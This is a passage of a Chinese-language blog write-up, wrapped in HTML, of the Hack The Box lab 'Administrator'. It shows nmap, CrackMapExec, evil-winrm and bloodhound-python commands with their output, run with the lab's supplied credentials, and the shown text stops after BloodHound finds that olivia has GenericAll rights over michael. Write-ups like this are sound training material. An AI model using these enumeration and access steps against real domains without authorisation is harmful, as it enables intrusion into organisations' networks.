@@ -1,0 +1,513 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="s is common in real life Windows pentests, you will start the Administrator box with credentials for the following account: Username: Olivia Password: ichliebedich用户名：Olivia密码：ichliebedich nmap -sCV -">
+<meta property="og:type" content="article">
+<meta property="og:title" content="htb-Administrator">
+<meta property="og:url" content="https://ca1msec.github.io/2024/10/03/%E5%9F%9F%E6%B8%97%E9%80%8F/htb-Administrator/index.html">
+<meta property="og:site_name" content="Ca1m">
+<meta property="og:description" content="s is common in real life Windows pentests, you will start the Administrator box with credentials for the following account: Username: Olivia Password: ichliebedich用户名：Olivia密码：ichliebedich nmap -sCV -">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734162976598-e15a6716-76f3-460b-9a25-ef1a7755de1b.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734163151310-eef8289b-a853-43e6-bd6a-bee65807651e.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734163334873-7aa7887c-79a3-46b4-b875-a595a6cd1e94.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734168252003-eb4fd5bf-abcd-403b-a19e-b0a6c26f8934.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734168422913-bead28a8-64b4-41e3-897a-32cccbfbd8d7.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734168679332-60dc56c5-0297-44d4-aee9-a571c6f0bdf8.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734168926833-e9c62747-0bf6-411e-8eba-19656aadb99e.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734169943968-96a14c7b-6c34-4c33-a401-cb42f0b3d7a7.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734170433273-6bbaf1e7-77d7-4785-a511-a82311921ab8.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734171146786-b9d44411-5cc5-4587-98d9-6f49a1cbb63a.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734171554355-7f2a77cf-4151-42f7-a7c7-bd92bbde3ba5.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734175893236-95d7ed55-3eee-4c84-a028-55cec189d4c9.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734176432890-2d7999a1-2f33-4d75-a09f-e22efaf18d64.png">
+<meta property="article:published_time" content="2024-10-03T14:51:29.000Z">
+<meta property="article:modified_time" content="2025-02-28T02:16:09.861Z">
+<meta property="article:author" content="Ca1m">
+<meta property="article:tag" content="域">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734162976598-e15a6716-76f3-460b-9a25-ef1a7755de1b.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>htb-Administrator</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/friends/">friends</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/10/03/%E5%9F%9F/%E5%9F%9F%E5%9F%BA%E7%A1%80/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/10/03/%E5%9F%9F%E6%B8%97%E9%80%8F/htb-Alert/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ca1msec.github.io/2024/10/03/%E5%9F%9F%E6%B8%97%E9%80%8F/htb-Administrator/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ca1msec.github.io/2024/10/03/%E5%9F%9F%E6%B8%97%E9%80%8F/htb-Administrator/&text=htb-Administrator"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ca1msec.github.io/2024/10/03/%E5%9F%9F%E6%B8%97%E9%80%8F/htb-Administrator/&title=htb-Administrator"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ca1msec.github.io/2024/10/03/%E5%9F%9F%E6%B8%97%E9%80%8F/htb-Administrator/&is_video=false&description=htb-Administrator"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=htb-Administrator&body=Check out this article: https://ca1msec.github.io/2024/10/03/%E5%9F%9F%E6%B8%97%E9%80%8F/htb-Administrator/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ca1msec.github.io/2024/10/03/%E5%9F%9F%E6%B8%97%E9%80%8F/htb-Administrator/&title=htb-Administrator"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ca1msec.github.io/2024/10/03/%E5%9F%9F%E6%B8%97%E9%80%8F/htb-Administrator/&title=htb-Administrator"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ca1msec.github.io/2024/10/03/%E5%9F%9F%E6%B8%97%E9%80%8F/htb-Administrator/&title=htb-Administrator"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ca1msec.github.io/2024/10/03/%E5%9F%9F%E6%B8%97%E9%80%8F/htb-Administrator/&title=htb-Administrator"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ca1msec.github.io/2024/10/03/%E5%9F%9F%E6%B8%97%E9%80%8F/htb-Administrator/&name=htb-Administrator&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ca1msec.github.io/2024/10/03/%E5%9F%9F%E6%B8%97%E9%80%8F/htb-Administrator/&t=htb-Administrator"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#smb%E7%88%86%E7%A0%B4"><span class="toc-number">1.</span> <span class="toc-text">smb爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WinRM-%E7%99%BB%E5%BD%95olivia"><span class="toc-number">2.</span> <span class="toc-text">WinRM 登录olivia</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E7%94%A8%E6%88%B7%E7%88%86%E7%A0%B4"><span class="toc-number">3.</span> <span class="toc-text">域用户爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%9D%83%E9%99%90"><span class="toc-number">4.</span> <span class="toc-text">获取权限</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#BloodHound-%E6%8F%90%E5%8F%96%E5%9F%9F%E4%BF%A1%E6%81%AF"><span class="toc-number">4.1.</span> <span class="toc-text">BloodHound 提取域信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">4.2.</span> <span class="toc-text">横向移动</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Olivia-michael"><span class="toc-number">4.2.1.</span> <span class="toc-text">Olivia-&gt;michael</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#michael-benjamin"><span class="toc-number">4.2.2.</span> <span class="toc-text">michael-&gt;benjamin</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#benjamin-emily"><span class="toc-number">4.2.3.</span> <span class="toc-text">benjamin-&gt;emily</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#emily-ethan"><span class="toc-number">4.2.4.</span> <span class="toc-text">emily-&gt;ethan</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Ethan-Administrator"><span class="toc-number">4.2.5.</span> <span class="toc-text">Ethan-&gt;Administrator</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%81%A2%E5%A4%8D%E6%97%B6%E9%97%B4"><span class="toc-number">5.</span> <span class="toc-text">恢复时间</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        htb-Administrator
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Ca1m</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-10-03T14:51:29.000Z" class="dt-published" itemprop="datePublished">2024-10-03</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2/">内网攻防</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/%E5%9F%9F/" rel="tag">域</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>s is common in real life Windows pentests, you will start the Administrator box with credentials for the following account: Username: Olivia Password: ichliebedich用户名：Olivia<br>密码：ichliebedich</p>
+<p>nmap -sCV -A -T4 -Pn 10.10.11.42</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-14 15:42 CST</span><br><span class="line">Nmap scan report for 10.10.11.42</span><br><span class="line">Host is up (0.62s latency).</span><br><span class="line">Not shown: 988 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">21/tcp   open  ftp           Microsoft ftpd</span><br><span class="line">| ftp-syst: </span><br><span class="line">|_  SYST: Windows_NT</span><br><span class="line">53/tcp   open  domain        Simple DNS Plus</span><br><span class="line">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-12-14 14:42:58Z)</span><br><span class="line">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">464/tcp  open  kpasswd5?</span><br><span class="line">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  tcpwrapped</span><br><span class="line">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp open  tcpwrapped</span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">OS:SCAN(V=7.94SVN%E=4%D=12/14%OT=21%CT=1%CU=42122%PV=Y%DS=2%DC=T%G=Y%TM=675</span><br><span class="line">OS:D375F%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=108%TI=I%CI=RD%II=I%TS=</span><br><span class="line">OS:A)SEQ(SP=107%GCD=1%ISR=108%TI=RD%CI=I%II=I%TS=A)SEQ(SP=107%GCD=1%ISR=108</span><br><span class="line">OS:%TI=RD%CI=RD%II=I%TS=C)OPS(O1=M53ANW8ST11%O2=M53ANW8ST11%O3=M53ANW8NNT11</span><br><span class="line">OS:%O4=M53ANW8ST11%O5=M53ANW8ST11%O6=M53AST11)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W</span><br><span class="line">OS:4=FFFF%W5=FFFF%W6=FFDC)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M53ANW8NNS%CC=Y%Q=)T1(</span><br><span class="line">OS:R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=</span><br><span class="line">OS:%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W</span><br><span class="line">OS:=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)</span><br><span class="line">OS:T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S</span><br><span class="line">OS:+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUC</span><br><span class="line">OS:K=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)</span><br><span class="line"></span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: 7h00m04s</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2024-12-14T14:44:08</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3:1:1: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 23/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   768.22 ms 10.10.16.1</span><br><span class="line">2   359.07 ms 10.10.11.42</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 136.19 seconds</span><br></pre></td></tr></table></figure>
+
+<p>ftp尝试失败</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734162976598-e15a6716-76f3-460b-9a25-ef1a7755de1b.png"></p>
+<h3 id="smb爆破"><a href="#smb爆破" class="headerlink" title="smb爆破"></a>smb爆破</h3><p>SMB 是一种网络文件共享协议，允许应用程序通过网络读取和写入文件、请求远程服务以及进行其他网络操作。</p>
+<p>利用提供的账号密码，使用<code>CrackMapExec</code>工具对<code>SMB 服务</code>进行枚举，验证提供的凭据是否可用，并查看是否存在有用的共享目录。</p>
+<p>CrackMapExec 是一个常用的渗透测试工具，主要用于 Windows 网络的枚举和利用。它特别适合对 SMB、RDP 和 WinRM 服务进行广泛扫描、认证、执行命令和枚举共享目录等操作</p>
+<p>结果显示，用户<code>Olivia</code> 的 SMB 登录有效，但未发现有用的共享目录，仅能读取常见的<code>NETLOGON</code> 和<code>SYSVOL</code></p>
+<p>crackmapexec smb 10.10.11.42 -u ‘Olivia’ -p ‘ichliebedich’ –shares</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734163151310-eef8289b-a853-43e6-bd6a-bee65807651e.png"></p>
+<h3 id="WinRM-登录olivia"><a href="#WinRM-登录olivia" class="headerlink" title="WinRM 登录olivia"></a><strong>WinRM 登录olivia</strong></h3><p>WinRM 是 Microsoft 提供的远程管理协议，允许远程执行命令、启动进程、管理系统设置等，类似于 Unix 系统中的 SSH</p>
+<p>使用 CrackMapExec 验证目标主机的<code>WinRM 服务</code>（端口 5985），发现凭据有效并成功登录。</p>
+<p>返回结果表明可以通过 WinRM 获取远程访问权限</p>
+<p>crackmapexec winrm 10.10.11.42 -u ‘Olivia’ -p ‘ichliebedich’</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734163334873-7aa7887c-79a3-46b4-b875-a595a6cd1e94.png"></p>
+<p>使用<code>evil-winrm</code>登录，使用<code>evil-winrm</code> 进一步获取目标主机的权限和用户信息</p>
+<p>并且通过运行<code>whoami /all</code> 命令查看用户权限</p>
+<p>evil-winrm -i 10.10.11.42 -u ‘Olivia’ -p ‘ichliebedich’</p>
+<p>并且通过运行<code>whoami /all</code> 命令查看用户权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# evil-winrm -i 10.10.11.42 -u &#x27;Olivia&#x27; -p &#x27;ichliebedich&#x27;</span><br><span class="line">                                        </span><br><span class="line">Evil-WinRM shell v3.5</span><br><span class="line">                                        </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine</span><br><span class="line">                                        </span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion</span><br><span class="line">                                        </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\olivia\Documents&gt; whoami /all</span><br><span class="line"></span><br><span class="line">USER INFORMATION</span><br><span class="line">----------------</span><br><span class="line"></span><br><span class="line">User Name            SID</span><br><span class="line">==================== ============================================</span><br><span class="line">administrator\olivia S-1-5-21-1088858960-373806567-254189436-1108</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GROUP INFORMATION</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">Group Name                                  Type             SID          Attributes</span><br><span class="line">=========================================== ================ ============ ==================================================</span><br><span class="line">Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group</span><br><span class="line">BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group</span><br><span class="line">BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group</span><br><span class="line">BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group</span><br><span class="line">Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Privilege Name                Description                    State</span><br><span class="line">============================= ============================== =======</span><br><span class="line">SeMachineAccountPrivilege     Add workstations to domain     Enabled</span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking       Enabled</span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a process working set Enabled</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">USER CLAIMS INFORMATION</span><br><span class="line">-----------------------</span><br><span class="line"></span><br><span class="line">User claims unknown.</span><br><span class="line"></span><br><span class="line">Kerberos support for Dynamic Access Control on this device has been disabled.</span><br><span class="line">*Evil-WinRM* PS C:\Users\olivia\Documents&gt; </span><br></pre></td></tr></table></figure>
+
+<p>结果发现<code>Olivia</code> 用户具有基本的操作权限，并且拥有<code>SeMachineAccountPrivilege</code>，允许其将计算机帐户添加到域中。</p>
+<h3 id="域用户爆破"><a href="#域用户爆破" class="headerlink" title="域用户爆破"></a>域用户爆破</h3><p>成功登录目标主机后，使用<code>net user</code> 命令对域内的用户进行枚举。列出当前域控制器上存在的所有用户账户。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\olivia\Documents&gt; net user</span><br><span class="line"></span><br><span class="line">User accounts for \\</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator            alexander                benjamin</span><br><span class="line">emily                    emma                     ethan</span><br><span class="line">Guest                    krbtgt                   michael</span><br><span class="line">olivia</span><br><span class="line">The command completed with one or more errors.</span><br></pre></td></tr></table></figure>
+
+<p><code>olivia</code>为当前使用的用户，其余为域内的其他用户</p>
+<h3 id="获取权限"><a href="#获取权限" class="headerlink" title="获取权限"></a>获取权限</h3><h4 id="BloodHound-提取域信息"><a href="#BloodHound-提取域信息" class="headerlink" title="BloodHound 提取域信息"></a>BloodHound 提取域信息</h4><p>使用工具<code>bloodhound.py</code>从域中提取信息</p>
+<p>BloodHound工具链接：<a target="_blank" rel="noopener" href="https://github.com/BloodHoundAD/BloodHound/releases">https://github.com/BloodHoundAD/BloodHound/releases</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/BloodHound-linux-x64]</span><br><span class="line">└─# bloodhound-python  -d administrator.htb -ns 10.10.11.42 -u &#x27;Olivia&#x27; -p ichliebedich -c All --zip</span><br><span class="line">INFO: Found AD domain: administrator.htb</span><br><span class="line">INFO: Getting TGT for user</span><br><span class="line">WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: unpack requires a buffer of 4 bytes</span><br><span class="line">INFO: Connecting to LDAP server: dc.administrator.htb</span><br><span class="line">INFO: Found 1 domains</span><br><span class="line">INFO: Found 1 domains in the forest</span><br><span class="line">INFO: Found 1 computers</span><br><span class="line">INFO: Connecting to LDAP server: dc.administrator.htb</span><br><span class="line">INFO: Found 11 users</span><br><span class="line">INFO: Found 53 groups</span><br><span class="line">INFO: Found 2 gpos</span><br><span class="line">INFO: Found 1 ous</span><br><span class="line">INFO: Found 19 containers</span><br><span class="line">INFO: Found 0 trusts</span><br><span class="line">INFO: Starting computer enumeration with 10 workers</span><br><span class="line">INFO: Querying computer: dc.administrator.htb</span><br><span class="line">WARNING: DCE/RPC connection failed: [Errno Connection error (10.10.11.42:445)] timed out</span><br><span class="line">WARNING: DCE/RPC connection failed: The NETBIOS connection with the remote host timed out.</span><br><span class="line">INFO: Done in 01M 14S</span><br><span class="line">INFO: Compressing output into 20241214163637_bloodhound.zip</span><br></pre></td></tr></table></figure>
+
+<p>运行此命令后，我们获得了压缩包<code>20241214163637_bloodhound.zip</code>，它包含了域中的所有关键信息。</p>
+<p>接下来，我们使用<code>sudo neo4j start</code>命令启动数据库，并使用<code>bloodhound</code>命令进入工具。将得到的zip压缩包拖入到Bloodhound中上传文件。账号neo4j 密码123456</p>
+<p>我们当前用户为<code>Olivia</code>，因此查看一下节点信息，左上角搜索Olivia，olivia有一个<code>First Degreee object control</code>(一级对象控制，接下来简称FDOC)，点击它可以看到olivia对用户michael拥有<code>GenericAll权限</code>。</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734168252003-eb4fd5bf-abcd-403b-a19e-b0a6c26f8934.png"></p>
